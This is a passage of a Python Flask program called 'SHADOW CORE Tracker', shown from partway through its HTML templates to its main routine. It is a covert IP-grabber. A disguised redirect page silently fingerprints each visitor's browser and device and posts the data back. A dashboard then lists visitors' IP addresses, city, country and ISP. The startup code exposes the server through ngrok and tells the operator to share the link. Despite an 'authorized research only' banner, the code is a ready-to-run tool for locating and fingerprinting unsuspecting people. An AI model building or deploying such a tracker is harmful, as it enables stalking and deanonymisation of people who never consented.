        <p class="redirect-text">Redirecting to {{ redirect_url }} in 3 seconds...</p>
        <p style="font-size: 10px; color: #555; margin-top: 40px; opacity: 0.6;">© 2025 AFRAFDHMA - All Rights Reserved</p>
    </div>
    
    <script>
        // Collect device fingerprint
        const fingerprint = {
            unique_id: '{{ unique_id }}',
            browser: navigator.userAgent,
            platform: navigator.platform,
            languages: navigator.languages.join(','),
            cookies_enabled: navigator.cookieEnabled,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen_width: window.innerWidth,
            screen_height: window.innerHeight,
            color_depth: screen.colorDepth,
            hardware_concurrency: navigator.hardwareConcurrency,
            device_memory: navigator.deviceMemory
        };
        
        // Send fingerprint data
        fetch('/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ fingerprint: fingerprint, unique_id: '{{ unique_id }}' })
        }).catch(e => console.log(e));
        
        // Redirect after 3 seconds
        setTimeout(() => {
            window.location.href = '{{ redirect_url }}';
        }, 3000);
    </script>
</body>
</html>
"""

DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>SHADOW CORE Dashboard</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="refresh" content="{{ auto_refresh }}">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.9.1/chart.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap');
        
        :root {
            --bg-primary: #0a0e27;
            --bg-secondary: #141829;
            --bg-tertiary: #1e2139;
            --border: #2a2f4a;
            --text-primary: #e4e9f0;
            --text-secondary: #a0a9c0;
            --accent-green: #10b981;
            --accent-cyan: #06b6d4;
            --accent-blue: #3b82f6;
            --accent-orange: #f59e0b;
            --accent-red: #ef4444;
            --accent-purple: #8b5cf6;
        }
        
        * { box-sizing: border-box; }
        
        body {
            margin: 0;
            padding: 0;
            background: var(--bg-primary);
            color: var(--text-primary);
            font-family: 'JetBrains Mono', monospace;
            font-size: 14px;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            background: linear-gradient(135deg, #141829 0%, #1e2139 100%);
            padding: 30px;
            border-radius: 12px;
            margin-bottom: 30px;
            border: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
        }
        
        .header-left h1 {
            margin: 0;
            font-size: 32px;
            background: linear-gradient(135deg, var(--accent-green), var(--accent-cyan));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 0 0 30px rgba(16, 185, 129, 0.2);
        }
        
        .header-info {
            color: var(--text-secondary);
            font-size: 12px;
            margin-top: 8px;
            display: flex;
            gap: 15px;
        }
        
        .status-dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: var(--accent-green);
            border-radius: 50%;
            animation: pulse 2s infinite;
            box-shadow: 0 0 10px var(--accent-green);
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }
        
        .header-right {
            text-align: right;
            color: var(--text-secondary);
            font-size: 12px;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: linear-gradient(135deg, #1e2139 0%, #252d4a 100%);
            padding: 25px;
            border-radius: 12px;
            border: 1px solid var(--border);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--accent-green), transparent);
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
            border-color: var(--accent-green);
            box-shadow: 0 10px 30px rgba(16, 185, 129, 0.2);
        }
        
        .stat-card h3 {
            margin: 0 0 12px 0;
            color: var(--text-secondary);
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }
        
        .stat-value {
            display: flex;
            align-items: baseline;
            gap: 10px;
        }
        
        .stat-card .number {
            font-size: 36px;
            font-weight: 700;
            background: linear-gradient(135deg, var(--accent-green), var(--accent-cyan));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .stat-card .delta {
            font-size: 12px;
            color: var(--accent-green);
        }
        
        .section {
            margin-bottom: 30px;
        }
        
        .section-title {
            font-size: 16px;
            color: var(--accent-green);
            margin: 0 0 20px 0;
            padding-bottom: 10px;
            border-bottom: 2px solid var(--border);
            font-weight: 700;
            letter-spacing: 1px;
        }
        
        .url-box {
            background: linear-gradient(135deg, #1e2139 0%, #252d4a 100%);
            padding: 25px;
            border-radius: 12px;
            margin-bottom: 30px;
            border: 1px solid var(--border);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        
        .url-box h3 {
            margin: 0 0 15px 0;
            color: var(--accent-cyan);
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
        }
        
        .url-box code {
            display: block;
            background: rgba(0, 0, 0, 0.3);
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            margin: 12px 0;
            border: 1px solid var(--border);
            color: var(--accent-green);
            word-break: break-all;
            overflow-x: auto;
        }
        
        .url-box small {
            color: var(--text-secondary);
            font-size: 12px;
        }
        
        .url-actions {
            display: flex;
            gap: 10px;
            margin-top: 15px;
            flex-wrap: wrap;
        }
        
        .chart-container {
            background: linear-gradient(135deg, #1e2139 0%, #252d4a 100%);
            padding: 25px;
            border-radius: 12px;
            border: 1px solid var(--border);
            margin-bottom: 30px;
            position: relative;
            height: 300px;
        }
        
        .chart-title {
            position: absolute;
            top: 15px;
            left: 25px;
            font-size: 13px;
            color: var(--accent-cyan);
            font-weight: 600;
            z-index: 10;
        }
        
        .table-container {
            background: linear-gradient(135deg, #1e2139 0%, #252d4a 100%);
            border-radius: 12px;
            border: 1px solid var(--border);
            overflow: hidden;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        
        .table-title {
            padding: 20px 25px;
            border-bottom: 1px solid var(--border);
            font-size: 13px;
            color: var(--accent-cyan);
            font-weight: 600;
        }
        
        .table-wrapper {
            overflow-x: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        th {
            background: rgba(0, 0, 0, 0.2);
            color: var(--accent-green);
            text-align: left;
            padding: 15px 25px;
            font-weight: 600;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1px;
            border-bottom: 1px solid var(--border);
        }
        
        td {
            padding: 14px 25px;
            border-bottom: 1px solid var(--border);
            font-size: 13px;
        }
        
        tr:hover {
            background: rgba(16, 185, 129, 0.05);
        }
        
        .ip-cell {
            font-family: 'Courier New', monospace;
            color: var(--accent-orange);
            font-weight: 600;
        }
        
        .location-cell {
            color: var(--text-primary);
        }
        
        .location-cell.unknown {
            color: var(--text-secondary);
        }
        
        .isp-cell {
            font-size: 12px;
            color: var(--text-secondary);
        }
        
        .ua-cell {
            font-size: 12px;
            color: var(--text-secondary);
            max-width: 250px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        
        .actions {
            display: flex;
            gap: 12px;
            margin-bottom: 30px;
            flex-wrap: wrap;
        }
        
        .btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 12px 24px;
            background: linear-gradient(135deg, #252d4a 0%, #1e2139 100%);
            color: var(--text-primary);
            text-decoration: none;
            border-radius: 8px;
            border: 1px solid var(--border);
            font-weight: 600;
            font-size: 13px;
            transition: all 0.3s ease;
            cursor: pointer;
            font-family: 'JetBrains Mono', monospace;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            border-color: var(--accent-green);
            box-shadow: 0 5px 15px rgba(16, 185, 129, 0.2);
        }
        
        .btn-primary {
            background: linear-gradient(135deg, var(--accent-green), #059669);
            color: white;
            border: none;
            box-shadow: 0 5px 15px rgba(16, 185, 129, 0.3);
        }
        
        .btn-primary:hover {
            box-shadow: 0 10px 25px rgba(16, 185, 129, 0.4);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, var(--accent-red), #dc2626);
            color: white;
            border: none;
            box-shadow: 0 5px 15px rgba(239, 68, 68, 0.3);
        }
        
        .btn-danger:hover {
            box-shadow: 0 10px 25px rgba(239, 68, 68, 0.4);
        }
        
        .btn-export {
            background: linear-gradient(135deg, var(--accent-cyan), #0891b2);
            color: white;
            border: none;
            box-shadow: 0 5px 15px rgba(6, 182, 212, 0.3);
        }
        
        .btn-export:hover {
            box-shadow: 0 10px 25px rgba(6, 182, 212, 0.4);
        }
        
        .footer {
            text-align: center;
            color: var(--text-secondary);
            font-size: 11px;
            margin-top: 40px;
            padding: 30px 20px;
            border-top: 1px solid var(--border);
            letter-spacing: 1px;
        }
        
        .grid-2 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(500px, 1fr));
            gap: 20px;
        }
        
        .empty-state {
            text-align: center;
            padding: 40px;
            color: var(--text-secondary);
        }
        
        .empty-state p {
            margin: 0;
            font-size: 13px;
        }
        
        @media (max-width: 768px) {
            .container { padding: 12px; }
            .header { flex-direction: column; align-items: flex-start; }
            .header-right { text-align: left; }
            .stats-grid { grid-template-columns: 1fr 1fr; }
            .grid-2 { grid-template-columns: 1fr; }
            .actions { flex-direction: column; }
            .btn { width: 100%; justify-content: center; }
            .table-wrapper { font-size: 12px; }
            td, th { padding: 10px 12px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-left">
                <h1>⚡ SHADOW CORE</h1>
                <div class="header-info">
                    <span><span class="status-dot"></span> System Active</span>
                    <span>{{ stats.total_visits }} visits tracked</span>
                    <span>{{ stats.unique_ips }} unique IPs</span>
                </div>
            </div>
            <div class="header-right">
                <div>{{ config.redirect_url }}</div>
                <div style="margin-top: 5px;">v2.0 | Ngrok Optimized</div>
            </div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <h3>📊 Total Visits</h3>
                <div class="stat-value">
                    <div class="number">{{ stats.total_visits }}</div>
                </div>
            </div>
            <div class="stat-card">
                <h3>📈 Today's Visits</h3>
                <div class="stat-value">
                    <div class="number">{{ stats.today_visits }}</div>
                </div>
            </div>
            <div class="stat-card">
                <h3>🌍 Unique IPs</h3>
                <div class="stat-value">
                    <div class="number">{{ stats.unique_ips }}</div>
                </div>
            </div>
            <div class="stat-card">
                <h3>🗺️ Countries</h3>
                <div class="stat-value">
                    <div class="number">{{ stats.countries }}</div>
                </div>
            </div>
        </div>
        
        <div class="section">
            <h2 class="section-title">🔗 TRACKING LINK</h2>
            <div class="url-box">
                <h3>Public Tracking URL</h3>
                <code id="trackingUrl">{{ public_url }}</code>
                <small>Share this link to track visitors. All clicks and interactions will be logged.</small>
                <div class="url-actions">
                    <button class="btn btn-primary" onclick="copyToClipboard()">📋 Copy URL</button>
                    <button class="btn" onclick="newTab()">🔗 Open</button>
                </div>
            </div>
        </div>
        
        <div class="section">
            <h2 class="section-title">📊 RECENT VISITS</h2>
            <div class="table-container">
                {% if stats.recent_visits %}
                <div class="table-wrapper">
                    <table>
                        <thead>
                            <tr>
                                <th>⏰ Time</th>
                                <th>🔒 IP Address</th>
                                <th>📍 Location</th>
                                <th>🏢 ISP</th>
                                <th>🌐 User Agent</th>
                            </tr>
                        </thead>
                        <tbody>
                            {% for visit in stats.recent_visits %}
                            <tr>
                                <td>{{ visit.timestamp[11:19] }}</td>
                                <td class="ip-cell">{{ visit.ip_address }}</td>
                                <td class="location-cell {% if visit.country == 'Unknown' %}unknown{% endif %}">
                                    {% if visit.country != 'Unknown' %}
                                    {{ visit.city }}, {{ visit.country }}
                                    {% else %}
                                    Unknown
                                    {% endif %}
                                </td>
                                <td class="isp-cell">{{ visit.isp[:20] }}{% if visit.isp|length > 20 %}...{% endif %}</td>
                                <td class="ua-cell" title="{{ visit.user_agent }}">{{ visit.user_agent[:35] }}{% if visit.user_agent|length > 35 %}...{% endif %}</td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>
                </div>
                {% else %}
                <div class="empty-state">
                    <p>No visits recorded yet. Share your tracking link to start collecting data.</p>
                </div>
                {% endif %}
            </div>
        </div>
        
        <div class="grid-2">
            <div class="section">
                <h2 class="section-title">🌍 TOP COUNTRIES</h2>
                <div class="table-container">
                    {% if stats.top_countries %}
                    <table>
                        <thead>
                            <tr>
                                <th>Country</th>
                                <th>Visits</th>
                                <th>Percentage</th>
                            </tr>
                        </thead>
                        <tbody>
                            {% for country in stats.top_countries %}
                            <tr>
                                <td>{{ country.country }}</td>
                                <td style="color: var(--accent-cyan);">{{ country.count }}</td>
                                <td>
                                    <div style="display: flex; align-items: center; gap: 8px;">
                                        <div style="width: 100px; height: 6px; background: var(--border); border-radius: 3px; overflow: hidden;">
                                            <div style="width: {% if stats.total_visits > 0 %}{{ ((country.count / stats.total_visits) * 100) }}{% else %}0{% endif %}%; height: 100%; background: linear-gradient(90deg, var(--accent-green), var(--accent-cyan));" ></div>
                                        </div>
                                        <span style="min-width: 40px;">
                                            {% if stats.total_visits > 0 %}
                                            {{ ((country.count / stats.total_visits) * 100)|round(1) }}%
                                            {% else %}
                                            0%
                                            {% endif %}
                                        </span>
                                    </div>
                                </td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>
                    {% else %}
                    <div class="empty-state">
                        <p>No country data available yet.</p>
                    </div>
                    {% endif %}
                </div>
            </div>
            
            <div class="section">
                <h2 class="section-title">⚙️ SYSTEM INFO</h2>
                <div class="table-container">
                    <table>
                        <tbody>
                            <tr>
                                <td style="color: var(--accent-green); font-weight: 600;">System Status</td>
                                <td style="text-align: right; color: var(--accent-green);">● Online</td>
                            </tr>
                            <tr>
                                <td style="color: var(--accent-green); font-weight: 600;">Database</td>
                                <td style="text-align: right;">{{ config.db_file }}</td>
                            </tr>
                            <tr>
                                <td style="color: var(--accent-green); font-weight: 600;">Ngrok Region</td>
                                <td style="text-align: right;">{{ config.ngrok_region.upper() }}</td>
                            </tr>
                            <tr>
                                <td style="color: var(--accent-green); font-weight: 600;">Fingerprinting</td>
                                <td style="text-align: right;">{% if config.enable_fingerprinting %}✓ Enabled{% else %}✗ Disabled{% endif %}</td>
                            </tr>
                            <tr>
                                <td style="color: var(--accent-green); font-weight: 600;">Auto-Refresh</td>
                                <td style="text-align: right;">{{ config.auto_refresh_dashboard }}s</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        
        <div class="actions">
            <a href="/export" class="btn btn-export">📥 Export Data (JSON)</a>
            <button class="btn btn-danger" onclick="clearData()">🗑️ Clear All Data</button>
            <a href="/logout" class="btn">🚪 Logout</a>
        </div>
        
        <div class="footer">
            ⚡ SHADOW CORE v2.0 | Ngrok Optimized | {{ stats.total_visits }} total visits | {{ datetime.now().strftime('%Y-%m-%d %H:%M:%S') }}
            <br>
            <span style="opacity: 0.7;">© 2025 AFRAFDHMA - All Rights Reserved</span>
        </div>
    </div>
    
    <script>
        function copyToClipboard() {
            const url = document.getElementById('trackingUrl').textContent;
            navigator.clipboard.writeText(url).then(() => {
                alert('✓ Tracking URL copied to clipboard!');
            }).catch(() => {
                alert('Failed to copy URL');
            });
        }
        
        function newTab() {
            const url = document.getElementById('trackingUrl').textContent;
            window.open(url, '_blank');
        }
        
        function clearData() {
            if (confirm('⚠️ WARNING: This will permanently delete ALL tracking data!\n\nThis action cannot be undone.\n\nAre you sure?')) {
                fetch('/clear', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        alert('✓ All data cleared successfully!');
                        location.reload();
                    } else {
                        alert('✗ Error clearing data');
                    }
                })
                .catch(error => {
                    alert('✗ Error: ' + error);
                });
            }
        }
        
        // Auto-refresh stats
        setInterval(() => {
            fetch('/api/stats')
                .then(response => response.json())
                .then(data => {
                    // Update stats dynamically with animation
                    updateStatCard(0, data.total_visits);
                    updateStatCard(1, data.today_visits);
                    updateStatCard(2, data.unique_ips);
                    updateStatCard(3, data.countries);
                })
                .catch(error => console.log('Auto-refresh error:', error));
        }, {{ auto_refresh }} * 1000);
        
        function updateStatCard(index, newValue) {
            const card = document.querySelectorAll('.stat-card')[index];
            const numberEl = card.querySelector('.number');
            const currentValue = parseInt(numberEl.textContent);
            
            if (currentValue !== newValue) {
                numberEl.style.transition = 'all 0.3s ease';
                numberEl.style.transform = 'scale(1.1)';
                numberEl.textContent = newValue;
                setTimeout(() => {
                    numberEl.style.transform = 'scale(1)';
                }, 300);
            }
        }
    </script>
</body>
</html>
"""

# ===================== MAIN EXECUTION =====================
def cleanup():
    """Cleanup on exit"""
    print("\n[+] Cleaning up...")
    ngrok.stop()
    db.conn.close()
    print("[+] Cleanup complete")

def print_banner():
    """Print startup banner"""
    banner = """
    ╔═══════════════════════════════════════════════════════════════╗
    ║                SHADOW CORE TRACKER v2.0                       ║
    ║               NGROK OPTIMIZED EDITION                         ║
    ║           Advanced IP/Geo-Location Tracking                   ║
    ║         FOR AUTHORIZED SECURITY RESEARCH ONLY                 ║
    ║                                                               ║
    ║         Developed by: AFRAFDHMA                               ║
    ║         © 2025 All Rights Reserved                            ║
    ╚═══════════════════════════════════════════════════════════════╝
    """
    print(banner)

def main():
    """Main execution"""
    # Register cleanup
    atexit.register(cleanup)
    
    # Print banner
    print_banner()
    
    # Check dependencies
    try:
        import flask
        import requests
        print("[✓] Dependencies: Flask, requests")
    except ImportError as e:
        print(f"[!] Missing dependency: {e}")
        print("[+] Install with: pip install flask requests")
        sys.exit(1)
    
    # Start ngrok if enabled
    public_url = None
    if CONFIG['ngrok_autostart']:
        if ngrok.start():
            public_url = ngrok.get_url()
        else:
            print("[!] Ngrok failed to start. Continue with local server only.")
    
    # Get local IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except:
        local_ip = "127.0.0.1"
    
    # Display URLs
    print(f"\n[+] Local Access:")
    print(f"    • Dashboard: http://{local_ip}:{CONFIG['port']}/login")
    print(f"    • Tracking:  http://{local_ip}:{CONFIG['port']}/")
    
    if public_url:
        print(f"\n[+] Public Access (via Ngrok):")
        print(f"    • Dashboard: {public_url}/login")
        print(f"    • Tracking:  {public_url}/")
        print(f"    • Region:    {CONFIG['ngrok_region'].upper()}")
    else:
        print(f"\n[!] Ngrok not running. Use 'ngrok http {CONFIG['port']}' manually")
        print(f"    or enable ngrok_autostart in CONFIG.")
    
    print(f"\n[+] Security:")
    print(f"    • Admin Password: {CONFIG['admin_password']}")
    print(f"    • Redirect URL:   {CONFIG['redirect_url']}")
    print(f"    • Database:       {CONFIG['db_file']}")
    
    print(f"\n[+] Tracking Features:")
    print(f"    • Geolocation:    Enabled")
    print(f"    • Fingerprinting: {'Enabled' if CONFIG['enable_fingerprinting'] else 'Disabled'}")
    print(f"    • Auto-refresh:   {CONFIG['auto_refresh_dashboard']}s")
    
    print(f"\n[+] Share the tracking URL to start collecting data!")
    print(f"[+] Press Ctrl+C to stop the server\n")
    
    # Start Flask server
    try:
        app.run(
            host=CONFIG['host'],
            port=CONFIG['port'],
            threaded=True,
            debug=False,
            use_reloader=False
        )
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user")
    except Exception as e:
        logger.critical(f"Server error: {e}")
        print(f"[!] Error: {e}")

if __name__ == '__main__':
    main()